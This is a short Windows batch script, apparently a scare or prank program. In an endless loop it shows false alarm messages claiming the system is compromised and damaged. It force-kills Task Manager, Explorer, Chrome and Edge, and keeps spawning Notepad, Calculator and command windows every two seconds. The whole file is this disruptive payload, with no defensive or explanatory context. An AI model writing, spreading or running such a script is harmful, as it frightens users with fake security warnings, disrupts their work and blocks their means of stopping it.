@echo off
color 04
title CRITICAL ERROR!
:loop
msg * CRITICAL DAMAGE! PLEASE RESTART NOW!!!
msg * SYSTEM COMPROMISED! SECURITY BREACH!
msg * ERROR 0xFATAL – SYSTEM DESTABILIZING!
taskkill /IM taskmgr.exe /F
taskkill /IM explorer.exe /F
taskkill /IM chrome.exe /F
taskkill /IM msedge.exe /F
start notepad
start calc
start cmd
timeout /t 2
goto loop

